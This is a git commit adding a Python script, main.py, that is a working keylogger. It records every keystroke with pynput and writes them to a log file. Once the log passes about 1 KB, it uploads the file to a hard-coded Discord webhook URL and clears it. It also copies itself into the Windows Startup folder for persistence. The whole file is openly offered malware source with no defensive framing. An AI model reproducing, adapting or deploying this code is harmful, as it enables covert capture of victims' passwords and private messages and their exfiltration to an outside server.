ff5a7d05690297f7b3697cc7006ff91754a29fa4
Echo <66488397+NullByte75@users.noreply.github.com>
2021-01-30 12:15:01 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,61 @@
+from pynput.keyboard import Listener
+import os
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import shutil
+
+user = os.environ["USERNAME"]
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ' [SHIFT] '
+    if key == 'Key.ctrl_l':
+        key = ' [CTRL] '
+    if key == "Key.enter":
+        key = '\n'
+    if key == "Key.backspace":
+        key = ' [DELETE] '
+    if key == "key.cmd":
+        key = ' [WINKEY] '
+
+    with open("log.txt", 'a') as f:
+        f.write(key)
+    size = os.path.getsize("log.txt") / 1000
+    if size > 1:
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/805008211995787285/fXfGRNZXubCFltykjp-SPtXtHazXamvDaHHBh1caKAy9CyOSa-4IehtZFFTu0rot0q7M', username="KeyLogger data", content="KeyLogger log file: ")
+        with open("log.txt", "rb") as f:
+            webhook.add_file(file=f.read(), filename='log.txt')
+        response = webhook.execute()
+        open('log.txt', 'w').close()
+
+def make_persistance():
+    try:
+        shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        return True
+    except:
+        return False
+
+def keylogger():
+    with Listener(on_press=log_keystroke) as l:
+        l.join()
+
+def check_persistance():
+    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
+        return True
+    else:
+        return False
+
+def main():
+    print("Checking for persistance")
+    if check_persistance():
+        keylogger()
+    else:
+        if make_persistance():
+            keylogger()
+        else:
+            exit()
+
+main()
